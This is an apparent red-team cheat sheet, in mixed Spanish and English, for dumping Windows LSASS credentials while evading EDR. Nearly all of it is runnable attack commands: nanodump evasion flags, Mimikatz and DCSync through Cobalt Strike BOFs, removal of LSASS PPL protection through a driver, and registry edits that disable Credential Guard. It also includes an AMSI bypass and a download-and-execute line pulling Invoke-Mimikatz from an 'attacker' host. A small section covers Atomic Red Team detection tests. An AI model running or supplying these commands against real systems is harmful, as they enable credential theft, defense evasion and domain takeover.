---
aliases:
  - nanodump
  - LSASS BOF
  - EDR Evasion LSASS
  - Custom LSASS Dumper
tags:
  - type/technique
  - technique/credential-access
  - technique/defense-evasion
  - env/windows
  - asset/active-directory
primary categories: null
secondary categories: null
tertiary categories: null
type: Technique
linked:
  - '[[LSASS Dumping]]'
---
# LSASS Dumping - Modern EDR Evasion

***

## nanodump (BOF / EXE)

| **Comando** | **Qué hace** | **Cuándo** |
|:---:|:---:|:---:|
| `nanodump.exe -w lsass.dmp` | Standard dump (custom mini-dumper) | EDR-evasion default. |
| `nanodump.exe -w lsass.dmp -v` | Valid dump (writeable PE) | Standard. |
| `nanodump.exe -w lsass.dmp --pid <PID>` | Por PID | Alt. |
| `nanodump.exe --fork -w lsass.dmp` | Fork process method (no MiniDumpWriteDump) | EDR bypass. |
| `nanodump.exe --snapshot -w lsass.dmp` | Process snapshot API | Modern. |
| `nanodump.exe --duplicate -w lsass.dmp` | Duplicate handle (avoid OpenProcess) | Stealth. |
| `nanodump.exe -d -w lsass.dmp` | Invalid signature dump (avoid AV signature) | EDR bypass. |
^lsass-evasion-nanodump

**Por qué:**
- Custom MiniDump implementation (no `MiniDumpWriteDump` API call directo).
- Multiple dump methods (fork, snapshot, duplicate handle).
- Optional invalid signature → bypass AV signature en `.dmp` files.
- BOF version para Cobalt Strike.

```cmd
:: Standard
nanodump.exe -w C:\temp\lsass.dmp -v

:: Stealth modes
nanodump.exe --fork -w C:\temp\lsass.dmp
nanodump.exe --snapshot -w C:\temp\lsass.dmp
nanodump.exe --duplicate -w C:\temp\lsass.dmp

:: Invalid signature (avoid AV file scan)
nanodump.exe -d -w C:\temp\lsass.dmp
```

___

## Cobalt Strike BOF (`mimikatz` / `nanodump`)

| **Comando (CS console)** | **Qué hace** | **Cuándo** |
|:---:|:---:|:---:|
| `mimikatz!sekurlsa::logonpasswords` | In-process Mimikatz BOF | CS standard. |
| `mimikatz!sekurlsa::ekeys` | AES keys via BOF | OPSEC. |
| `nanodump --write lsass.dmp` (BOF version) | Custom dumper inline | Stealth. |
| `lsadump dcsync /domain:corp.local /user:krbtgt` | DCSync via BOF | DCSync inline. |
^lsass-evasion-bof

**Por qué BOF:** Beacon Object File runs **in-process** del beacon. No spawn child process, no binary on disk, minimal IOCs. Modern preferred.

___

## SafetyKatz / SharpSecDump (Custom .NET)

| **Comando** | **Qué hace** | **Cuándo** |
|:---:|:---:|:---:|
| `SafetyKatz.exe` | Renombrado/obfuscated mimikatz + minidump auto | OPSEC. |
| `SharpSecDump.exe -target=<target> -username=<u> -password=<p>` | Remote LSASS dump via SMB | Lateral. |
| `Invoke-Mimikatz` (PowerSploit) | PS reflective load mimikatz | AMSI bypass needed. |
| `Invoke-MaskedMimi` o variants | Custom masked PS | Modern. |
^lsass-evasion-custom

___

## DInjector / Indirect Syscalls

| **Comando** | **Qué hace** | **Cuándo** |
|:---:|:---:|:---:|
| `DInjector.exe -p lsass -dll mimikatz.dll` | DLL injection con direct syscalls | Bypass userland hooks. |
| Custom shellcode con `Hell's Gate` / `Halo's Gate` syscall resolution | Direct syscalls bypass EDR | Advanced. |
| `SysWhispers3` generated stubs | Compile-time direct syscalls | Custom tooling. |
^lsass-evasion-dinjector

**Concepto:** EDRs hookean userland API (`OpenProcess`, `MiniDumpWriteDump`). Direct syscalls (vía `int 2eh` o `syscall` instruction) bypass userland completamente.

___

## RunAsPPL Bypass

| **Comando** | **Qué hace** | **Cuándo** |
|:---:|:---:|:---:|
| `mimidrv.sys` (mimikatz signed driver, KMD) | Patch LSASS protection via kernel | If RunAsPPL active. |
| `PPLdump64.exe -d <output.dmp> lsass` | Custom PPL bypass tool | Modern alt. |
| `PPLBlade` | Comprehensive PPL bypass research tool | Advanced. |
| `mimikatz # !+` | Load mimidrv driver (admin required) | mimikatz built-in. |
| `mimikatz # !processprotect /process:lsass.exe /remove` | Remove LSASS protection | Post-driver-load. |
^lsass-evasion-pplbypass

```cmd
:: Mimikatz RunAsPPL bypass
mimikatz # !+
:: Loads mimidrv.sys driver (Vulnerable Driver Loading - BYOVD-style)
mimikatz # !processprotect /process:lsass.exe /remove
:: Now LSASS unprotected
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords
```

___

## Credential Guard Bypass

| **Aspecto** | **Detalle** |
|:---:|:---:|
| Credential Guard | VBS-based, isolates LSASS secrets to VSM (Virtual Secure Mode) | Hardware-rooted protection. |
| Bypass viable | UEFI exploit / BYOVD (Bring Your Own Vulnerable Driver) | Advanced. |
| Common path | Disable VBS via registry post-DA → reboot | Aggressive. |
| Modern detection | Patches + Defender for Endpoint | Hardened. |
^lsass-evasion-credguard

```cmd
:: Disable VBS (requires DA + reboot)
reg add "HKLM\SYSTEM\CurrentControlSet\Control\DeviceGuard" /v EnableVirtualizationBasedSecurity /t REG_DWORD /d 0 /f
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v LsaCfgFlags /t REG_DWORD /d 0 /f
shutdown /r /t 0
:: Post-reboot: Credential Guard disabled, mimikatz funciona
```

___

## In-Process MimiSpray (PS reflective)

| **Comando** | **Qué hace** | **Cuándo** |
|:---:|:---:|:---:|
| `IEX (New-Object Net.WebClient).DownloadString('http://attacker/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds` | PS reflective load | AMSI bypass req. |
| `Invoke-Mimikatz -DumpCerts` | Cert dump variant | Adjacent. |
| `Invoke-Mimikatz -ComputerName <target>` | Remote via WMI/PS Remoting | Lateral. |
^lsass-evasion-psreflective

**AMSI bypass requirement:** modern Defender hooks AMSI → blocks Mimikatz strings. Bypass:
```powershell
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

___

## Atomic Tests / EDR Lab

| **Tool** | **Use** | **Cuándo** |
|:---:|:---:|:---:|
| Atomic Red Team T1003.001 | Test detection coverage | Validation. |
| Out-Minidump.ps1 (Empire) | PS-based minidump | Legacy. |
| `Invoke-Atomic T1003.001-1` | Test ProcDump detection | Defender lab. |
^lsass-evasion-atomic

___

## OPSEC Comparison Modern

| **Method** | **Detection (modern EDR)** | **Effort** |
|:---:|:---:|:---:|
| Mimikatz on-disk | **Almost universal alert** | Low. |
| comsvcs.dll MiniDump | Some EDRs detect | Low. |
| ProcDump (renamed) | Defender signature check | Low. |
| nanodump | Less detect (custom) | Low. |
| BOF in-beacon | Minimal IOCs | Medium. |
| Direct syscalls custom | Very stealth | High (custom dev). |
| RunAsPPL bypass via driver | Driver load logged + KASLR | High. |
| Credential Guard bypass | Reboot required + audit | Very high. |
^lsass-evasion-comparison

___

## Common Errors

| **Error** | **Causa** | **Fix** |
|:---:|:---:|:---:|
| `STATUS_ACCESS_DENIED` post-OpenProcess | RunAsPPL active | Driver bypass. |
| `Empty dump file` | EDR blocks write | Try alt method. |
| `nanodump signature invalid` | EDR signature catches output `.dmp` | `-d` invalid sig flag. |
| `BOF execution failed` | Beacon arch mismatch (x86 vs x64) | Match arch. |
| `Direct syscall fail` | Win10 build mismatch (SSN drift) | Update SSN table. |
^lsass-evasion-errors

***
